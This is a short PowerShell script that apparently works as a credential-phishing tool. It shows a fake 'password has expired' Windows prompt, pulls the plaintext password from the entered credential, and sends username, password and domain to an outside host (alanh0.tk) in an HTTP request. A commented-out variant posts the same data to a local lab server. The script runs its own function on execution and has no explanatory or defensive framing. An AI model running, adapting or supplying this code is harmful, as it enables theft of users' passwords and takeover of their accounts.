﻿function Invoke-LoginPrompt {
	$cred = $Host.ui.PromptForCredential("Your password has expired and must be changed.", "Old Password", "$env:userdomain\$env:username","")
	$username = "$env:username"
	$domain = "$env:userdomain"
	$password = $cred.GetNetworkCredential().password
    Invoke-WebRequest -URI http://alanh0.tk/gmail/submit.php?username=$username+$password+$domain
    
    #	$cred = $Host.ui.PromptForCredential("Your password has expired and must be changed.", "Old Password", "$env:userdomain\$env:username","")
	#$username = "$env:username"
	#$domain = "$env:userdomain"
	#$password = $cred.GetNetworkCredential().password
	#$url = "http://192.168.56.102/collect.php"
	#$command = '{"username":"' + $username + '","domain":"' + $domain + '"+ "","password":"' + $password + '"}'
	#$bytes = [System.Text.Encoding]::ASCII.GetBytes($command)
	#$web = [System.Net.WebRequest]::Create($url)
	#$web.Method = "POST"
	#$web.ContentLength = $bytes.Length
	##$web.ContentType = "application/json"
	#$web.UserAgent = "Mozilla/5.0"
	#$stream = $web.GetRequestStream()
	#$stream.Write($bytes,0,$bytes.Length)
	#$stream.close()

}
#Start-Sleep -s 10
Invoke-LoginPrompt